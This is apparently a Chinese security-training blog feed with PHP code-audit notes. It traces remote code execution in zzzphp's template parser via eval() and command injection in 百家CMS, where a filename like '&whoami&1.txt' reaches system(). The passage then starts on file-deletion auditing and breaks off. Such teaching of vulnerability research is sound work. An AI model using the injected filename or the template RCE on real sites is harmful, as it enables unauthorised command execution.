href="#CNVD拿1day-RCE代码执行-ZZZPHP" class="headerlink" title="#CNVD拿1day-RCE代码执行-ZZZPHP"></a>#CNVD拿1day-RCE代码执行-ZZZPHP</h4><p><a href="https://www.anquanke.com/post/id/173991">zzzphpV1.6.1 远程代码执行漏洞简单分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://xz.aliyun.com/tab/1">技术文章 - 先知社区 (aliyun.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1605191">zzzphp V1.6.1 远程代码执行漏洞分析 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h6 id="搜索关键字eval，其他的都不是，只有第一个这个是eval-函数"><a href="#搜索关键字eval，其他的都不是，只有第一个这个是eval-函数" class="headerlink" title="搜索关键字eval，其他的都不是，只有第一个这个是eval()函数"></a>搜索关键字eval，其他的都不是，只有第一个这个是eval()函数</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329201639786.png" alt="image-20230329201639786"></p><h6 id="发现要利用eval这个地方，就必须找到调用这个方法的地方"><a href="#发现要利用eval这个地方，就必须找到调用这个方法的地方" class="headerlink" title="发现要利用eval这个地方，就必须找到调用这个方法的地方"></a>发现要利用eval这个地方，就必须找到调用这个方法的地方</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330162516527.png" alt="image-20230330162516527"></p><h6 id="进行跟踪这个方法，点击查找用法，有一处用到"><a href="#进行跟踪这个方法，点击查找用法，有一处用到" class="headerlink" title="进行跟踪这个方法，点击查找用法，有一处用到"></a>进行跟踪这个方法，点击查找用法，有一处用到</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330162650619.png" alt="image-20230330162650619"></p><h6 id="发现它在一个类里面，而要调用这个方法则要找到调用这个类class的地方"><a href="#发现它在一个类里面，而要调用这个方法则要找到调用这个类class的地方" class="headerlink" title="发现它在一个类里面，而要调用这个方法则要找到调用这个类class的地方"></a>发现它在一个类里面，而要调用这个方法则要找到调用这个类class的地方</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330163212962.png" alt="image-20230330163212962"></p><h6 id="继续跟踪用法，找到很多处，先看zzz-client-php里面的"><a href="#继续跟踪用法，找到很多处，先看zzz-client-php里面的" class="headerlink" title="继续跟踪用法，找到很多处，先看zzz_client.php里面的"></a>继续跟踪用法，找到很多处，先看zzz_client.php里面的</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330163054806.png" alt="image-20230330163054806"></p><h6 id="这四处分别是"><a href="#这四处分别是" class="headerlink" title="这四处分别是"></a>这四处分别是</h6><h6 id="1、条件-zcontent-x3D-user-tpl时"><a href="#1、条件-zcontent-x3D-user-tpl时" class="headerlink" title="1、条件$zcontent&#x3D;$user_tpl时"></a>1、条件$zcontent&#x3D;$user_tpl时</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330163643099.png" alt="image-20230330163643099"></p><h6 id="跟踪下声明这个-user-tpl的地方，发现这个地方不可控，因为它等于空，修改了也无法触发"><a href="#跟踪下声明这个-user-tpl的地方，发现这个地方不可控，因为它等于空，修改了也无法触发" class="headerlink" title="跟踪下声明这个$user_tpl的地方，发现这个地方不可控，因为它等于空，修改了也无法触发"></a>跟踪下声明这个$user_tpl的地方，发现这个地方不可控，因为它等于空，修改了也无法触发</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330163852177.png" alt="image-20230330163852177"></p><h6 id="2、3、4处"><a href="#2、3、4处" class="headerlink" title="2、3、4处"></a>2、3、4处</h6><h6 id="跟踪一下这个load-file是什么，发现变量前面的可能是模板位置路径，后一个可能是访问其的url之类的"><a href="#跟踪一下这个load-file是什么，发现变量前面的可能是模板位置路径，后一个可能是访问其的url之类的" class="headerlink" title="跟踪一下这个load_file是什么，发现变量前面的可能是模板位置路径，后一个可能是访问其的url之类的"></a><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330164328292.png" alt="image-20230330164328292">跟踪一下这个load_file是什么，发现变量前面的可能是模板位置路径，后一个可能是访问其的url之类的</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330165412385.png" alt="image-20230330165412385"></p><h6 id="所以回到之前的地方，两个变量都追踪一下，发现了-tplfile是受-location的影响的，可以知道刚才的判断是对的，-tplfile是模板的位置路径所在，而-location是访问这个模板的url变量，case是选择不同的值"><a href="#所以回到之前的地方，两个变量都追踪一下，发现了-tplfile是受-location的影响的，可以知道刚才的判断是对的，-tplfile是模板的位置路径所在，而-location是访问这个模板的url变量，case是选择不同的值" class="headerlink" title="所以回到之前的地方，两个变量都追踪一下，发现了$tplfile是受$location的影响的，可以知道刚才的判断是对的，$tplfile是模板的位置路径所在，而$location是访问这个模板的url变量，case是选择不同的值"></a>所以回到之前的地方，两个变量都追踪一下，发现了$tplfile是受$location的影响的，可以知道刚才的判断是对的，$tplfile是模板的位置路径所在，而$location是访问这个模板的url变量，case是选择不同的值</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330165244383.png" alt="image-20230330165244383"></p><blockquote><h5 id="上述图片的三行代码："><a href="#上述图片的三行代码：" class="headerlink" title="上述图片的三行代码："></a>上述图片的三行代码：</h5><p>$zcontent &#x3D; load_file($tplfile,$location);<br>$parser &#x3D; new ParserTemplate();<br>$zcontent &#x3D; $parser-&gt;parserCommom($zcontent); &#x2F;&#x2F; 解析模板</p><ol><li>使用 <code>load_file()</code> 函数从 <code>$tplfile</code> 指定的文件位置加载文件内容，并将结果保存到 <code>$zcontent</code> 变量中。</li><li>创建一个名为 ParserTemplate 的对象，并将其赋值给 <code>$parser</code> 变量。</li><li>调用 <code>$parser</code> 对象的 <code>parserCommom()</code> 方法，传入 <code>$zcontent</code> 变量作为参数进行处理，并将返回的结果重新赋值给 <code>$zcontent</code> 变量。</li></ol><p> <code>$parser</code> 对象的作用是对模板进行解析处理，而 <code>$zcontent</code> 变量则可能是包含了模板内容的字符串。因此，通过以上代码，我们可以将模板文件的内容加载到 PHP 脚本中，并对其进行一些必要的解析处理，最终得到用于渲染模板的内容。</p></blockquote><h6 id="所以也就可以解释的通上面的-zcontent-x3D-user-tpl时-user-tpl等于空为固定值时修改模板内容无效的原因了"><a href="#所以也就可以解释的通上面的-zcontent-x3D-user-tpl时-user-tpl等于空为固定值时修改模板内容无效的原因了" class="headerlink" title="所以也就可以解释的通上面的$zcontent&#x3D;$user_tpl时,$user_tpl等于空为固定值时修改模板内容无效的原因了"></a>所以也就可以解释的通上面的$zcontent&#x3D;$user_tpl时,$user_tpl等于空为固定值时修改模板内容无效的原因了</h6><h6 id="这里选择case里面的serach访问，先修改里面的serach-html代码"><a href="#这里选择case里面的serach访问，先修改里面的serach-html代码" class="headerlink" title="这里选择case里面的serach访问，先修改里面的serach.html代码"></a>这里选择case里面的serach访问，先修改里面的serach.html代码</h6><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330171029492.png" alt="image-20230330171029492"></p><p>出现phpinfo界面</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230330171119622.png" alt="image-20230330171119622"></p><h4 id="CNVD拿1day-RCE命令执行-百家CMS"><a href="#CNVD拿1day-RCE命令执行-百家CMS" class="headerlink" title="#CNVD拿1day-RCE命令执行-百家CMS"></a>#CNVD拿1day-RCE命令执行-百家CMS</h4><p>搜索关键字，找到第一处有system()调用的地方</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329165932506.png" alt="image-20230329165932506"></p><p>里面有两个变量，但是第一处不予以考虑，因为有一个intval($scal)会将变量改为整型，控制不了</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329173207258.png" alt="image-20230329173207258"></p><p>所以搜索第二个变量的出处，因为它是file_save方法调用，所以跟踪这个方法，看是谁调用了这个方法</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329173406077.png" alt="image-20230329173406077"></p><p>一共找到四处，因为前三处涉及的方法太多，考虑最后一个</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329173629931.png" alt="image-20230329173629931"></p><p>跟踪到这个方法，发现是有涉及一个变量$file,尝试看看这个file是什么，在哪传参</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329173857648.png" alt="image-20230329173857648"></p><p>找到这个文件中它第一次出现的地方，发现它是一个表单值，<strong>这里的$_FILES是php专有的文件上传语法</strong>，所以这里应该是一个文件上传的地方，file是要上传的文件</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329174008331.png" alt="image-20230329174008331"></p><p>根据文件所在访问url，到达这个界面</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329174957598.png" alt="image-20230329174957598"></p><p>找到下面的授权文件右键查看到确实是form表单名</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329175419253.png" alt="image-20230329175419253"></p><p>回到刚才的文件common.inc.php文件，发现执行system()有前提条件</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329175743418.png" alt="image-20230329175743418"></p><p>此处的设置打开才会进入if语句执行</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329180050613.png" alt="image-20230329180050613"></p><p>寻找这个表单值是控制什么的</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329180121016.png" alt="image-20230329180121016"></p><p>发现是压缩图片的功能，找到界面对应的地方</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329180446111.png" alt="image-20230329180446111"></p><p>在<strong>未开启</strong>的条件下如果提交一个&amp;whoami&amp;1.txt文件，不会出现命令执行漏洞效果</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329180246337.png" alt="image-20230329180246337"></p><p>在<strong>开启</strong>的条件下如果提交一个&amp;whoami&amp;1.txt文件，会出现命令执行漏洞效果</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329180553650.png" alt="image-20230329180553650"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day82 代码审计-PHP项目&amp;MVC文件安全&amp;上传&amp;包含&amp;下载&amp;删除&amp;读取等</title>
      <link href="/2023/03/26/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/"/>
      <url>/2023/03/26/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<h4 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、审计漏洞-文件上传&amp;删除&amp;写入&amp;读取等</p><p>1、审计思路-正则搜索&amp;功能追踪&amp;辅助工具</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h4 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h4><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h4 id="简要点："><a href="#简要点：" class="headerlink" title="#简要点："></a>#简要点：</h4><p>1、代码审计必备知识点：</p><p>环境搭建使用，工具插件安装使用，掌握各种漏洞原理及利用,代码开发类知识点。</p><p>2、代码审计开始前准备：</p><p>审计目标的程序名，版本，当前环境(系统,中间件,脚本语言等信息),各种插件等。</p><p>3、代码审计挖掘漏洞根本：</p><p>可控变量及特定函数，不存在过滤或过滤不严谨存在绕过导致的安全漏洞。</p><p>4、代码审计教学计划：</p><p>审计项目漏洞原理-&gt;审计思路-&gt;完整源码-&gt;应用框架-&gt;验证并利用漏洞。</p><p>5、代码审计教学内容：</p><p>PHP,Java,.NET,Python网站应用，引入框架类开发源码，相关审计工具及插件使用。</p><h3 id="补充点："><a href="#补充点：" class="headerlink" title="#补充点："></a>#补充点：</h3><h5 id="MVC模型：见上图"><a href="#MVC模型：见上图" class="headerlink" title="-MVC模型：见上图"></a>-MVC模型：见上图</h5><p>当访问动态网页时，以MVC框架为例，浏览器提交查询到控制器（①），如是动态请求，控制器将对应sql查询送到对应模型（②），由模型和数据库交互得到查询结果返回给控制器（③），最后返回给浏览器（④）。</p><h5 id="动态调试配置：phpStudy-PhpStorm-XDebug"><a href="#动态调试配置：phpStudy-PhpStorm-XDebug" class="headerlink" title="-动态调试配置：phpStudy + PhpStorm + XDebug"></a>-动态调试配置：phpStudy + PhpStorm + XDebug</h5><p><a href="https://blog.csdn.net/nzjdsds/article/details/100114242">https://blog.csdn.net/nzjdsds/article/details/100114242</a></p><p>1、先确定PHP版本有Xdebug</p><p>2、php.ini配置写入并开启Xdebug</p><p>3、PhpStorm设置端口及IDEY并测试</p><p>4、PhpStorm开启监听并运行断点访问</p><h5 id="动态调试分析-phpstudy-amp-phpstorm-amp-xdebug"><a href="#动态调试分析-phpstudy-amp-phpstorm-amp-xdebug" class="headerlink" title="动态调试分析-phpstudy&amp;phpstorm&amp;xdebug"></a>动态调试分析-phpstudy&amp;phpstorm&amp;xdebug</h5><h6 id="PHP5配置："><a href="#PHP5配置：" class="headerlink" title="PHP5配置："></a>PHP5配置：</h6><p><a href="https://blog.csdn.net/weixin_40418199/article/details/79088365">https://blog.csdn.net/weixin_40418199/article/details/79088365</a></p><h6 id="PHP7配置："><a href="#PHP7配置：" class="headerlink" title="PHP7配置："></a>PHP7配置：</h6><p><a href="https://www.jb51.net/article/195840.htm">https://www.jb51.net/article/195840.htm</a></p><h5 id="文件代码比对工具：Beyond-Compare-4"><a href="#文件代码比对工具：Beyond-Compare-4" class="headerlink" title="-文件代码比对工具：Beyond Compare 4"></a>-文件代码比对工具：Beyond Compare 4</h5><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 文件安全-文件包含-动态调试-xhcms</p><p>​                ➢ 文件安全-文件删除-关键字搜索-zzzcms</p><p>​                ➢ 文件安全-文件下载-功能点定位-earmusic</p><p>​                ➢ CNVD&amp;1DAY-删除&amp;读取&amp;写入-梦想CMS</p></blockquote><h4 id="文件安全-文件包含-动态调试-xhcms"><a href="#文件安全-文件包含-动态调试-xhcms" class="headerlink" title="#文件安全-文件包含-动态调试-xhcms"></a>#文件安全-文件包含-动态调试-xhcms</h4><h6 id="1、动态调试-amp-关键字搜索-代码执行流程-amp-漏洞函数关键字"><a href="#1、动态调试-amp-关键字搜索-代码执行流程-amp-漏洞函数关键字" class="headerlink" title="1、动态调试&amp;关键字搜索-代码执行流程&amp;漏洞函数关键字"></a>1、动态调试&amp;关键字搜索-代码执行流程&amp;漏洞函数关键字</h6><h6 id="2、调试首页对应代码，修改数据，分析执行流程，测试漏洞"><a href="#2、调试首页对应代码，修改数据，分析执行流程，测试漏洞" class="headerlink" title="2、调试首页对应代码，修改数据，分析执行流程，测试漏洞"></a>2、调试首页对应代码，修改数据，分析执行流程，测试漏洞</h6><p>直接在首页动态断点调试</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328144328179.png" alt="image-20230328144328179"></p><h4 id="文件安全-文件删除-关键字搜索-zzzcms"><a href="#文件安全-文件删除-关键字搜索-zzzcms" class="headerlink" title="#文件安全-文件删除-关键字搜索-zzzcms"></a>#文件安全-文件删除-关键字搜索-zzzcms</h4><p>代码分析：<a href="https://blog.csdn.net/weixin_44978149/article/details/118282795">(22条消息) 【PHP代码审计】ZZZCMS任意文件删除_HanQi丶的博客-CSDN博客</a></p><h6 id="1、关键字挖掘-文件删除搜索关键字unlink-对应函数del-file，查看调用"><a href="#1、关键字挖掘-文件删除搜索关键字unlink-对应函数del-file，查看调用" class="headerlink" title="1、关键字挖掘-文件删除搜索关键字unlink,对应函数del_file，查看调用"></a>1、关键字挖掘-文件删除搜索关键字unlink,对应函数del_file，查看调用</h6><h6 id="2、后台delfile函数调用，如何处理delfile函数，受参数控制，进行测试"><a href="#2、后台delfile函数调用，如何处理delfile函数，受参数控制，进行测试" class="headerlink" title="2、后台delfile函数调用，如何处理delfile函数，受参数控制，进行测试"></a>2、后台delfile函数调用，如何处理delfile函数，受参数控制，进行测试</h6><h6 id="3、构造Payload-确定过滤-重新构造Payload-配合重装机制实现重装漏洞"><a href="#3、构造Payload-确定过滤-重新构造Payload-配合重装机制实现重装漏洞" class="headerlink" title="3、构造Payload-确定过滤-重新构造Payload-配合重装机制实现重装漏洞"></a>3、构造Payload-确定过滤-重新构造Payload-配合重装机制实现重装漏洞</h6><p>搜索关键字unlink找到这个文件</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328135701880.png" alt="image-20230328135701880"></p><p>这里的file因为不是这个函数控制的，所以看谁调用了这个del_file方法，查找使用</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328135837980.png" alt="image-20230328135837980"></p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328135951427.png" alt="image-20230328135951427"></p><p>这里直接调用delfile不能访问这个地方进行删除，因为没有调用这个delfile方法，这个zzzcms是常规源码，<strong>常规源码访问方法所在路径不一定成功，一定要访问调用这个方法的文件才可以</strong></p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328140301846.png" alt="image-20230328140301846"></p><p>常规源码如下例子：</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328140957258.png" alt="image-20230328140957258"></p><p>调用后就可以执行功能了</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328141331382.png" alt="image-20230328141331382"></p><blockquote><p><strong>无论是mvc源码还是常规源码，一定要找到（1、传参的地方  如：post get 某个变量2、调用函数的地方），所以mvc的只要找到传参的地方就行，而常规的源码，既要找到传参方法的地方还要找到调用这个方法的地方结合起来分析</strong></p></blockquote><p>接着上面的，点查找使用delfile的地方</p><p><img 